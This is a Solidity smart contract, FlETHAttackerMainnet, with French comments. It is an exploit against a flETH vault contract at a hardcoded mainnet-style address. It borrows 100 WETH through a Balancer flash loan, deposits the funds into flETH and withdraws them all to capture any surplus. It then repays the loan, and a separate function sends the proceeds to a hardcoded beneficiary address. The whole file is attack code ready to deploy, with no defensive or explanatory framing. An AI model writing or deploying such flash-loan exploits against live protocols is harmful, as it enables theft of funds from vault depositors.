// SPDX-License-Identifier: MIT
pragma solidity ^0.8.26;

interface IFLETHStrategy {
    function balanceInETH() external view returns (uint256);
}

interface IFLETH {
    function balanceOf(address) external view returns (uint256);
    function totalSupply() external view returns (uint256);
    function deposit(uint256 wethAmount) external payable;
    function withdraw(uint256 amount) external;
    function strategy() external view returns (IFLETHStrategy);
}

interface IWETH {
    function deposit() external payable;
    function withdraw(uint256) external;
    function approve(address, uint256) external returns (bool);
    function transfer(address, uint256) external returns (bool);
    function balanceOf(address) external view returns (uint256);
}

interface IBalancerVault {
    function flashLoan(
        address recipient,
        address[] memory tokens,
        uint256[] memory amounts,
        bytes memory userData
    ) external;
}

contract FlETHAttackerMainnet {
    IFLETH public constant flETH = IFLETH(0x000000000D564D5be76f7f0d28fE52605afC7Cf8);
    IBalancerVault public constant balancerVault = IBalancerVault(0xBA12222222228d8Ba445958a75a0704d566BF2C8);
    IWETH public constant WETH = IWETH(0x4200000000000000000000000000000000000006);

    address public constant BENEFICIARY = 0x161B2CA2f65a4b8bfd4317569b2Fc386CFB2A1A0;

    uint256 public constant FLASHLOAN_AMOUNT = 100 ether;

    address public immutable deployer;
    uint256 public profit;
    bool public attackExecuted;

    event AttackStarted(uint256 flashloanAmount, address indexed beneficiary);
    event AttackCompleted(uint256 profit);
    event ETHReceived(address from, uint256 amount);

    modifier onlyDeployer() {
        require(msg.sender == deployer, "Only deployer");
        _;
    }

    modifier notExecuted() {
        require(!attackExecuted, "Attack already executed");
        _;
    }

    constructor() {
        deployer = msg.sender;
    }

    function executeAttack() external onlyDeployer notExecuted {
        attackExecuted = true;
        emit AttackStarted(FLASHLOAN_AMOUNT, BENEFICIARY);

        // Lancer le flashloan Balancer (0% fee)
        address[] memory tokens = new address[](1);
        tokens[0] = address(WETH);

        uint256[] memory amounts = new uint256[](1);
        amounts[0] = FLASHLOAN_AMOUNT;

        balancerVault.flashLoan(
            address(this),
            tokens,
            amounts,
            ""
        );
    }

    function receiveFlashLoan(
        address[] memory tokens,
        uint256[] memory amounts,
        uint256[] memory feeAmounts,
        bytes memory
    ) external {
        require(msg.sender == address(balancerVault), "Only Balancer");
        require(tokens[0] == address(WETH), "Wrong asset");
        require(feeAmounts[0] == 0, "Expected 0% fee");

        uint256 amount = amounts[0];

        // Unwrap WETH -> ETH
        WETH.withdraw(amount);

        // FLOW EXACT DE LA TRACE:
        // 1. Deposit 100 ETH dans flETH
        //    → flETH mint 100 flETH
        //    → flETH envoie ~45 ETH vers Strategy (Aave)
        flETH.deposit{value: amount}(0);

        uint256 flETHBalance = flETH.balanceOf(address(this));

        // 2. Withdraw tout flETH
        //    → flETH envoie 10 ETH direct depuis son balance
        //    → flETH demande 90 ETH à Strategy
        //    → Strategy retire d'Aave et envoie à nous
        flETH.withdraw(flETHBalance);

        // On a maintenant 100 ETH back (10 direct + 90 de Strategy)
        uint256 finalBalance = address(this).balance;

        // Calculer profit
        if (finalBalance >= amount) {
            profit = finalBalance - amount;
        }

        emit AttackCompleted(profit);

        // Rembourser flashloan
        WETH.deposit{value: amount}();
        require(WETH.transfer(address(balancerVault), amount), "WETH transfer failed");
    }

    receive() external payable {
        // Juste recevoir les ETH de flETH
        emit ETHReceived(msg.sender, msg.value);
    }

    fallback() external payable {
        // Juste recevoir les ETH
    }

    function checkSystemState() external view returns (
        uint256 flETHDirectBalance,
        uint256 strategyBalance,
        uint256 flETHTotalSupply,
        uint256 ourBalance
    ) {
        flETHDirectBalance = address(flETH).balance;
        strategyBalance = flETH.strategy().balanceInETH();
        flETHTotalSupply = flETH.totalSupply();
        ourBalance = address(this).balance;
    }

    function withdrawProfit() external onlyDeployer {
        uint256 balance = address(this).balance;
        require(balance > 0, "No profit to withdraw");

        (bool success,) = BENEFICIARY.call{value: balance}("");
        require(success, "Transfer failed");
    }
}
